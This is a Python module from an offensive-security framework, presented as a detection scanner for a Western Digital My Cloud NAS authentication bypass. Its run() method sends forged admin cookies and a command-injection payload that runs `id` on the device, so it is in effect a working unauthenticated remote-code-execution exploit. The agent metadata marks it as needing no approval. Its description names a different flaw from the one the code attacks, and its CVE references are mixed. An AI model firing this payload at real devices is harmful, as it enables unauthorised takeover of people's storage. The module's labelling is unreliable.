#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""It was discovered that the Western Digital My Cloud device before 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Western Digital MyCloud NAS - Authentication Bypass Detection',
        'description': 'It was discovered that the Western Digital My Cloud device before 2.30.196 is affected by an authentication bypass vulnerability. An unauthenticated attacker can exploit this vulnerability to authenticate as an admin user without needing to provide a password, thereby gaining full control of the device. (Whenever an admin logs into My Cloud, a server-side session is created that is bound to the user\'s IP address. After the session is created, it is possible to call authenticated CGI modules by sending the cookie username=admin in the HTTP request. The invoked CGI will check if a valid session is present and bound to the user\'s IP address.) It was found that it is possible for an unauthenticated attacker to create a valid session without a login. The network_mgr.cgi CGI module contains a command called \\"cgi_get_ipv6\\" that starts an admin session -- tied to the IP address of the user making the request -- if the additional parameter \\"flag\\" with the value \\"1\\" is provided. Subsequent invocation of commands that would normally require admin privileges now succeed if an attacker sets the username=admin cookie.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2018', 'cve', 'packetstorm', 'auth-bypass', 'rce', 'wdcloud', 'western_digital', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://web.archive.org/web/20170315123948/https://www.stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/',
            'https://packetstormsecurity.com/files/173802/Western-Digital-MyCloud-Unauthenticated-Command-Injection.html',
            'https://securify.nl/nl/advisory/SFY20180102/authentication-bypass-vulnerability-in-western-digital-my-cloud-allows-escalation-to-admin-privileges.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-10108',
            'http://packetstormsecurity.com/files/173802/Western-Digital-MyCloud-Unauthenticated-Command-Injection.html',
        ],
        'cve': 'CVE-2018-17153',
    }

    def run(self):
        path = '/web/google_analytics.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': 'isAdmin=1; username=admin;'}, data='cmd=set&opt=cloud-device-num&arg=0|echo%20`id`%20%23\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('ganalytics',)
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Western Digital MyCloud NAS - Authentication Bypass detected', path=path)
            return True
        return False

